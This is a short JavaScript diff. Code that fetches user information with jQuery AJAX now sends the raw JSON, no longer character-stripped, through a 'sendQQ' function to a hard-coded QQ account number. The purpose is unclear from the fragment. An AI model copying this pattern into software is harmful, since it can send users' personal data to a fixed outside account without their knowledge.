@@ -39,5 +39,5 @@ const userInformationData = $.parseJSON($.ajax({
   dataType: "json",
   async: false
 }).responseText);
-const userInformation = JSON.stringify(userInformationData.data).replaceAll(`"`," ").replaceAll(`{`," ").replaceAll(`}`," ").replaceAll(`.`,"，");
+const userInformation = JSON.stringify(userInformationData.data);
 sendQQ(userInformation,2775997367);
